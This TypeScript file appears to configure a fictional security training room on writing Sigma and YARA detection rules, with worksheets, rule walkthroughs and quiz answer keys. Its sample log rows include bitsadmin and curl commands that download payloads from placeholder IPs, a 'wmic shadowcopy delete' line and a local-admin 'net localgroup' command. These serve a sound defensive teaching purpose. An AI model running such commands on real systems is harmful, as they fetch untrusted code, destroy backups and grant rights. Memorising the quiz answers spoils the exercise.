import type { RoomExperience } from "./types";

// "Operation Rule and Sign" for the "sigma-yara-rule-authoring" room.
// Script: docs/campaign/107-sigma-yara-rule-authoring.md.
// Station task ids must match the room's task order exactly (see getRoomExperience).
//
// Pelham Instruments (fictional). Mentor: Tatiana Ogunleye, Detection Content Author.
// PRACTICAL MISSIONS (pilot): the graded work is four missions in src/lib/missions/rooms/ruleAndSign.ts,
// in which the learner writes the rules and the server runs them on test corpora:
//   sigyara-mx1 Sigma for how it arrived (bitsadmin delivery, process_creation events, hidden variants)
//   sigyara-mx2 the KQL twin of that rule over DeviceProcessEvents (dataset "rule-and-sign"), then its spread
//   sigyara-mx3 the strings of calhelper.exe with the corpus vote, then the YARA rule on two sets
//   sigyara-mx4 boss: fix the pulled rule so it catches the stripped builds (count and ceiling)
// They replace q1, qf1, qf2, ac1, qf3, q2, m1, o1, la1 and f1. The arcade labs left with them (the
// strings sort, the modifier duel, the conversion codebreak, the Count and Ceiling tune, the hit queue,
// the sensor sort) and so did the labs keyed to retired tasks (the rule-walk trace, the goodware spotdiff,
// whose rule was the graded answer).
// Order: r1, r2 | r3, mx1, r4, mx2 | r5, r6, mx3 | mx4. Readings stay in order 1 to 6.
//
// Lab data differs from the graded missions. The block worksheet on Reading 2 uses /transfer with
// /priority and never the graded switch set, OriginalFileName or windash. The rule anatomy and the
// two-SIEM table on Readings 3 and 4 are a certutil and curl download rule, never bitsadmin, so neither
// shows the graded rule or its KQL. The phrase worksheet's bitsadmin rows teach switch order only. The
// YARA labs are Kestrel's rule with $loop and a [2-6] gap, never the calhelper strings, the decode
// bytes or the graded count and ceiling; the sequence lab names no string or value.

export const SIGMA_YARA_RULE_AUTHORING: RoomExperience = {
  roomId: "sigma-yara-rule-authoring",
  codename: "Operation Rule and Sign",
  theme: "ruleandsign",
  handler: { name: "Tatiana Ogunleye", role: "Detection Content Author, Pelham Instruments" },
  briefing: [
    "Pelham Instruments. 900 people building precision balances and calibration gear for hospital and university labs, and every firmware image ships under one signing key.",
    "On Monday the EDR (endpoint detection and response) agent pulled a small unsigned program off PEL-BLD-03, the build host that sits next to that key.",
    "The first YARA rule written for it matched 412 ordinary files and was pulled within the hour. YARA describes files, and its cousin Sigma describes log events.",
    "Tatiana Ogunleye, Detection Content Author, signs off every rule that reaches production, and the firmware signs on Friday. Start from a blank page and write it tight.",
  ],
  mission: "Write the Sigma rule for how the sample arrived and run it on real process events, hand-write its KQL twin, open the sample's strings and let the corpus vote, write the YARA rule, then fix the rule that matched goodware.",
  estimate: "~70 min",
  look: { primary: "#9ad4d6", secondary: "#ffd08a", warn: "#ff5a6e" },
  scene: "facilityruleandsign",
  layout: "facility",
  stations: [
    {
      id: "sample",
      label: "The Sample",
      topic: "Too broad and too narrow · contains and all · startswith and endswith · regex · multi-block conditions",
      tagline: "What will still be there next week?",
      building: "control",
      taskIds: ["sigyara-r1", "sigyara-r2"],
    },
    {
      id: "sigma",
      label: "The Sigma Rule",
      topic: "Writing a rule on process events · windash and OriginalFileName · Sigma to KQL by hand",
      tagline: "A blank page and one hypothesis",
      building: "lab",
      taskIds: ["sigyara-r3", "sigyara-mx1", "sigyara-r4", "sigyara-mx2"],
    },
    {
      id: "yara",
      label: "The YARA Rule",
      topic: "Strings and the corpus vote · ascii and wide · N of · testing on two sets",
      tagline: "Quiet on goodware, loud on the next build",
      building: "office",
      taskIds: ["sigyara-r5", "sigyara-r6", "sigyara-mx3"],
    },
    {
      id: "signoff",
      label: "The Sign-Off",
      topic: "Fixing a rule that matched goodware: count and ceiling",
      tagline: "Nothing left to read but the loop",
      building: "ticket",
      taskIds: ["sigyara-mx4"],
      boss: true,
    },
  ],
  personas: {
    "sigyara-mx1": { name: "Tatiana Ogunleye", role: "Detection Content Author", line: "Write it for the next delivery, not this one." },
    "sigyara-mx2": { name: "Tatiana Ogunleye", role: "Detection Content Author", line: "Same rows, or I sign neither." },
    "sigyara-mx3": { name: "Tatiana Ogunleye", role: "Detection Content Author", line: "Let the corpus vote, then write the rule." },
    "sigyara-mx4": { name: "Tatiana Ogunleye", role: "Detection Content Author", line: "Fix it, don't bin it." },
  },
  briefings: {
    // ── Reading 2: modifiers and quantifiers ──
    "sigyara-r2": [
      {
        kind: "worksheet",
        title: "Does This Block Fire?",
        prompt: "Sunil's draft block is in the caption over the table. Six process events came in from Pelham's build network: work out which ones it matches.",
        caption: "selection: Image|endswith '\\bitsadmin.exe' AND CommandLine|contains|all ['/transfer', '/priority'] · condition: selection",
        primer: {
          title: "Reading One Block",
          fold: true,
          points: [
            "Every line in a block must pass on the same event. Lines are AND, lists under one field are OR unless `|all` says otherwise.",
            "`Image` is the file of the process this event is about. `CommandLine` is how that process was started. Mentioning a program in a command line doesn't make it the Image.",
            "`endswith` looks only at the end of the path, so the folder can be anything.",
          ],
          example: {
            label: "Worked example: Image|endswith '\\net.exe' AND CommandLine|contains 'group'",
            lines: [
              "`net group \"Domain Admins\" /domain` run by `net.exe`: both lines pass, it fires.",
              "`whoami /groups` run by `whoami.exe`: the word is there, the program isn't, so it stays quiet.",
              "`net user` run by `net.exe`: the program is there, the word isn't, so it stays quiet.",
            ],
          },
        },
        columns: ["Row", "Image", "CommandLine"],
        rows: [
          ["A", "C:\\Windows\\System32\\bitsadmin.exe", "bitsadmin /transfer fw /priority high http://203.0.113.58/u.bin C:\\ProgramData\\u.bin"],
          ["B", "C:\\Windows\\System32\\bitsadmin.exe", "bitsadmin /transfer fw /download http://203.0.113.58/u.bin C:\\ProgramData\\u.bin"],
          ["C", "C:\\Python312\\python.exe", "python fetch.py --note \"bitsadmin /transfer /priority\""],
          ["D", "C:\\Windows\\System32\\bitsadmin.exe", "BITSADMIN /TRANSFER sync /PRIORITY foreground http://dist.pelham.example/s.msi C:\\Temp\\s.msi"],
          ["E", "C:\\Temp\\x\\bitsadmin.exe", "bitsadmin /transfer x /priority low http://198.51.100.24/c.dll C:\\Temp\\c.dll"],
          ["F", "C:\\Windows\\System32\\bitsadmin.exe", "bitsadmin /list /allusers /verbose"],
        ],
        questions: [
          { id: "many", q: "How many of the six rows fire?", hint: "Both lines of the block must pass on the same row. Sigma ignores letter case.", answer: ["3", "three"], why: "A, D and E. D is in capitals, and Sigma matching ignores case unless the rule says |cased. B and F each lack an item, and C fails on Image." },
          { id: "python", q: "Row C's command line holds both items. Does it fire? (yes/no)", hint: "Which program does this event describe?", answer: ["no", "n"], why: "This event is about python.exe. The word bitsadmin is only text passed to it, so the Image line fails." },
          { id: "folder", q: "Row E runs from C:\\Temp\\x. Does it fire? (yes/no)", hint: "What does endswith look at?", answer: ["yes", "y"], why: "endswith checks the end of the path, so a copy in any folder still matches, as long as the file keeps that name." },
          { id: "missing", q: "Row B has /transfer and a URL. Does it fire? (yes/no)", hint: "How many items does |all need?", answer: ["no", "n"], why: "|all needs every listed item, and /priority isn't there." },
        ],
      },
    ],
    // ── Reading 3: a Sigma rule step by step ──
    "sigyara-r3": [
      {
        kind: "anatomy",
        title: "A Two-Tool Sigma Rule, Line by Line",
        prompt: "This is the rule Tatiana built from Sunil's draft for the next stage arriving through a download tool. Read it in the order it was written, because the order is the method.",
        source: "Sigma rule · rules/windows/process_creation/download_tool_fetch.yml",
        fields: [
          { key: "title", value: "Download Tool Fetches a File from the Web", label: "Name", note: "The text an analyst sees in the queue." },
          { key: "description", value: "The loader on PEL-BLD-03 pulls its next stage with a built-in download tool.", label: "Step 1: hypothesis", note: "The idea in plain language. It's written before any syntax." },
          { key: "logsource.category", value: "process_creation", label: "Step 2: which log", note: "Process starts, whichever product records them." },
          { key: "logsource.product", value: "windows", note: "With the category, this tells a converter which data the rule is about." },
          { key: "sel_certutil.Image|endswith", value: "'\\certutil.exe'", label: "Step 3: first tool", note: "Image holds the path of the file that ran, so this names the program itself." },
          { key: "sel_certutil.CommandLine|contains|all", value: "['urlcache', 'http']", note: "Both items must appear, in any order: certutil's cache switch and a URL." },
          { key: "sel_curl.Image|endswith", value: "'\\curl.exe'", label: "Step 3: second tool", note: "A separate block, because this tool takes different arguments." },
          { key: "sel_curl.CommandLine|contains|all", value: "['-o', 'http']", note: "curl's output option and a URL." },
          { key: "condition", value: "sel_certutil or sel_curl", label: "Step 4: how blocks combine", note: "One run uses one tool, so either block fires the rule. To fire on a single block, a condition just names it: condition: sel_certutil." },
          { key: "falsepositives", value: "Software deployment jobs; build agents fetching packages from the artifact server", label: "Step 5: legitimate matches", note: "Sigma calls these false positives. In verdict terms they're benign true positives: the rule saw a real download, and a job or a ticket is what authorises it." },
          { key: "level", value: "medium", label: "Step 6", note: "How loud the rule is. Builds fetch files every day, which is reflected here." },
          { key: "tags", value: "attack.command-and-control, attack.t1105", note: "The ATT&CK tactic and T1105, Ingress Tool Transfer. Coverage reports read these." },
        ],
        summary: "Six steps, always in this order: say the idea, pick the log, write one block per tool, join the blocks, write down what legitimately matches, then set level and tags. The Image line ties each block to a real program and the CommandLine line says what that program was doing. Together they stop the rule firing on a ticket, a script name or a note that merely mentions the same words.",
      },
      {
        kind: "worksheet",
        title: "One Phrase or Separate Words?",
        prompt: "Sunil wants to know when a phrase is enough and when the words have to be listed apart. Here are three tools as Pelham's hosts really run them.",
        caption: "Command lines from Pelham's process logs, with what can change between runs",
        primer: {
          title: "When Word Order Can Move",
          fold: true,
          points: [
            "`contains: 'a b'` is one phrase: those characters, side by side, in that order.",
            "`contains|all: ['a', 'b']` is two checks: both present, anywhere, in either order.",
            "Many tools accept their switches in any order, and put other values between them.",
            "Some tools have a fixed grammar, and there a phrase is steady.",
          ],
          example: {
            label: "Worked example: adding a local admin with net.exe",
            lines: [
              "Run: `net localgroup administrators temp /add`.",
              "`contains: 'localgroup /add'` never matches, because two values sit between the words.",
              "`contains|all: ['localgroup', '/add']` matches, whatever sits between them.",
            ],
          },
        },
        columns: ["#", "Tool", "Command as typed", "What can change"],
        rows: [
          ["1", "bitsadmin", "bitsadmin /transfer fw /download /priority high http://203.0.113.58/u.bin u.bin", "Switch order"],
          ["2", "bitsadmin", "bitsadmin /transfer fw /priority high /download http://203.0.113.58/u.bin u.bin", "Switch order"],
          ["3", "curl", "curl -o u.bin http://203.0.113.58/u.bin", "Option order"],
          ["4", "curl", "curl http://203.0.113.58/u.bin -o u.bin", "Option order"],
          ["5", "wmic", "wmic process call create \"notepad.exe\"", "Nothing: alias, then verb"],
          ["6", "wmic", "wmic useraccount list brief", "Nothing: alias, then verb"],
          ["7", "wmic", "wmic shadowcopy delete", "Nothing: alias, then verb"],
        ],
        questions: [
          { id: "phrase", q: "Rows 1 and 2 are the same download. On how many of those two does CommandLine|contains: '/download /priority' fire?", hint: "Look for those characters side by side.", answer: ["1", "one"], why: "Only row 1 has them side by side. Row 2 has the same switches in another order, so one literal phrase misses it." },
          { id: "words", q: "On how many of those two does CommandLine|contains|all: ['/download', '/priority'] fire?", hint: "Order doesn't matter here.", answer: ["2", "two"], why: "Both items are in both rows, so a change of order changes nothing." },
          { id: "fixed", q: "A rule on row 5 uses one phrase, 'process call create'. Would that phrase still match if the host name changed in a wmic /node: prefix? (yes/no)", hint: "A global switch goes before the alias.", answer: ["yes", "y"], why: "wmic reads alias, then verb, so those words stay together. Where a tool's grammar holds them side by side, one phrase is steady." },
        ],
      },
    ],
    // ── Reading 4: Sigma to query ──
    "sigyara-r4": [
      {
        kind: "worksheet",
        title: "Same Rule, Two SIEMs",
        prompt: "Pelham runs Sentinel, and its acquired plant in Leeds still runs Splunk. Here is one rule converted for both. Read across each row.",
        caption: "Download Tool Fetches a File from the Web, converted twice",
        columns: ["Part", "Sigma rule", "Sentinel KQL", "Splunk SPL (Sysmon add-on)"],
        rows: [
          ["Data", "category: process_creation", "DeviceProcessEvents", "EventCode=1"],
          ["Program", "Image|endswith: '\\certutil.exe'", "FolderPath endswith @'\\certutil.exe'", "Image=\"*\\\\certutil.exe\""],
          ["Both items", "CommandLine|contains|all: ['urlcache', 'http']", "ProcessCommandLine contains 'urlcache' and ProcessCommandLine contains 'http'", "CommandLine=\"*urlcache*\" CommandLine=\"*http*\""],
          ["Blocks", "sel_certutil or sel_curl", "(...) or (...)", "(...) OR (...)"],
        ],
        questions: [
          { id: "lines", q: "Leeds moves from Splunk to Sentinel. How many lines of the Sigma rule have to change?", hint: "What was chosen at conversion time?", answer: ["0", "none", "zero"], why: "None. The rule keeps its logic, and only the backend and pipeline differ." },
          { id: "col", q: "Which Sentinel column carries what Sigma calls CommandLine?", hint: "Read the third row.", answer: ["ProcessCommandLine"], why: "The pipeline renames it. Sigma's Image likewise becomes FolderPath, while Splunk on Sysmon data often keeps the original names." },
          { id: "and", q: "A different rule's condition reads sel_a and sel_b. Which KQL word joins the two parenthesised groups?", hint: "Read the last row, then think about the word in this condition.", answer: ["and"], why: "The boolean word carries straight across, and each block becomes one bracketed group." },
        ],
      },
    ],
    // ── Reading 5: hex wildcards, counting, offsets ──
    "sigyara-r5": [
      {
        kind: "anatomy",
        title: "A YARA Rule, Line by Line",
        prompt: "Before Tatiana writes the rule for this sample, here's one from last year's case: Kestrel, a keylogger. Scan each line for what it asks of a file.",
        source: "YARA rule · rules/files/kestrel_keylogger.yar",
        primer: {
          title: "YARA in Three Parts",
          fold: true,
          points: [
            "YARA describes files. A rule has optional `meta`, then `strings` to look for, then a `condition` that must be true.",
            "Strings come in three kinds: text in double quotes, hex bytes in braces, and regular expressions between slashes.",
            "A module adds knowledge of a format. After `import \"pe\"`, a condition can read a Windows executable's parsed headers.",
          ],
          example: {
            label: "Worked example: the three kinds of string",
            lines: [
              "Text: `$t = \"cmd /c\" ascii`",
              "Hex: `$h = { E8 00 00 00 00 5B }`",
              "Regex: `$r = /[a-z2-7]{16}\\.onion/`",
            ],
          },
        },
        fields: [
          { key: "import", value: "\"pe\"", label: "Module", note: "Loads the module that reads Windows executable (PE) headers." },
          { key: "rule", value: "Kestrel_Keylogger", label: "Name" },
          { key: "$mz", value: "{ 4D 5A }", label: "Hex string", note: "The two bytes a Windows executable starts with." },
          { key: "$pipe", value: "\"\\\\\\\\.\\\\pipe\\\\kst_ctl\" ascii wide", label: "Encodings", note: "ascii is the single-byte form. wide is the UTF-16 form Windows programs often store text in, with a zero byte after each character. Listing both looks for both." },
          { key: "$verb", value: "\"flush\" fullword nocase", label: "Whole word", note: "nocase ignores letter case. fullword needs a non-alphanumeric character on each side, so it matches -flush and not autoflush." },
          { key: "$loop", value: "{ 0F B6 ?? 34 5A [2-6] 88 07 }", label: "Hex wildcards", note: "?? is any one byte. [2-6] is a gap of any 2 to 6 unknown bytes between two fixed runs, which lets one pattern fit small layout changes between builds." },
          { key: "$mz at 0", value: "in the condition", label: "Offset", note: "Ties the string to byte 0, the very start of the file." },
          { key: "filesize < 1MB", value: "in the condition", label: "Size", note: "Holds the rule to files of a size this tool could be." },
          { key: "pe.number_of_signatures == 0", value: "in the condition", label: "From the module", note: "How many code signatures the file carries. Zero means unsigned." },
          { key: "#loop > 3", value: "in the condition", label: "Count", note: "# counts how many times a string occurs. This asks for at least four." },
          { key: "1 of ($pipe, $verb)", value: "in the condition", label: "N of", note: "N of (...) needs that many strings from the list. With 1, either will do, which suits alternatives where one sample carries only one." },
        ],
        summary: "Strings say what to look for and how to read it. The condition joins them: where a string sits, how often it occurs, how big the file is, what the headers say. Each of these operators sharpens a signal that's already worth having. None of them makes a poor string useful.",
      },
      {
        kind: "worksheet",
        title: "Read the Scan Output",
        prompt: "Kestrel's rule ran over a file left on a test bench. Tatiana ran it with yara -s, which prints every string match. Read the output the way the condition does.",
        caption: "yara -s kestrel_keylogger.yar bench_unit.bin",
        primer: {
          title: "Counts and Offsets",
          fold: true,
          points: [
            "`yara -s` prints one line per match: the offset, the string's name, the bytes found.",
            "`#name` is the number of times a string occurred.",
            "`@name[i]` is the offset of occurrence number i, starting from 1.",
            "`$name at N` is true when the string occurs at exactly that offset.",
          ],
          example: {
            label: "Worked example: another file, two strings",
            lines: [
              "`0x0:$hdr`, `0x120:$key`, `0x480:$key`",
              "`#key` is 2 and `@key[2]` is 0x480.",
              "`$hdr at 0` is true. `$key at 0` is false.",
            ],
          },
        },
        columns: ["Offset", "String", "Bytes found"],
        rows: [
          ["0x0", "$mz", "4D 5A"],
          ["0x1a40", "$loop", "0F B6 08 34 5A 90 90 88 07"],
          ["0x1c12", "$loop", "0F B6 0E 34 5A 41 FF C1 88 07"],
          ["0x1f08", "$loop", "0F B6 01 34 5A 90 48 FF C0 88 07"],
          ["0x2290", "$loop", "0F B6 0B 34 5A 41 90 88 07"],
          ["0x3b60", "$pipe", "5C 00 5C 00 2E 00 5C 00 70 00 69 00 70 00 65 00 ..."],
          ["0x4410", "$verb", "Flush"],
        ],
        questions: [
          { id: "count", q: "What is #loop for this file?", hint: "Count the rows.", answer: ["4", "four"], why: "Four rows carry $loop. The middle bytes differ on each row, and the [2-6] gap accepts them all." },
          { id: "first", q: "What is @loop[1]?", hint: "The first occurrence's offset.", answer: ["0x1a40", "1a40"], why: "Numbering starts at 1, so @loop[1] is the first match and @loop[4] is the last." },
          { id: "more", q: "Does #loop > 3 hold? (yes/no)", hint: "Use your count.", answer: ["yes", "y"], why: "4 is more than 3. One or two hits of a short pattern can be chance, and a repeat is a habit." },
          { id: "mz", q: "Does $mz at 0 hold? (yes/no)", hint: "Read the first row's offset.", answer: ["yes", "y"], why: "The MZ bytes sit at the very first byte, which is where a real executable's header belongs." },
          { id: "word", q: "The file also holds the word autoflush. Would $verb match inside it? (yes/no)", hint: "$verb has fullword.", answer: ["no", "n"], why: "fullword needs a non-alphanumeric character on both sides, and here the letter o sits right before flush." },
        ],
      },
    ],
    // ── Reading 6: a YARA rule step by step ──
    "sigyara-r6": [
      {
        kind: "sequence",
        title: "From Hypothesis to Sign-Off",
        prompt: "Here's how the Calhelper rule actually got made, shuffled. Put Tatiana's morning back in order.",
        items: [
          { id: "e", text: "Ran the draft over the known-bad builds and Pelham's own software", note: "Two sets, because either one alone tells half the story." },
          { id: "a", text: "Wrote one line: this loader hides its strings and decodes each one with the same short routine", note: "The idea comes first, in plain words, with no syntax yet." },
          { id: "c", text: "Added two more signals from other parts of the file beside the first string", note: "A second kind of signal, from a different part of the file." },
          { id: "f", text: "Recorded which real files matched, then set the severity last", note: "Only real results can say what legitimately matches, and how loud the rule should be." },
          { id: "b", text: "Tried the first string that came to hand, and asked who else has it", note: "An obvious draft is fine, as long as it gets checked in both directions." },
          { id: "d", text: "Set a size ceiling and limited the rule to Windows executables", note: "Once the signals are in, narrow the scope around them." },
        ],
        order: ["a", "b", "c", "d", "e", "f"],
        doneNote: "The idea, a quick draft, a check in both directions, more signals, a narrower scope, a test on both sets, then notes and severity. Each step uses what the one before produced, and severity goes last because it depends on what testing found.",
      },
    ],
  },
};
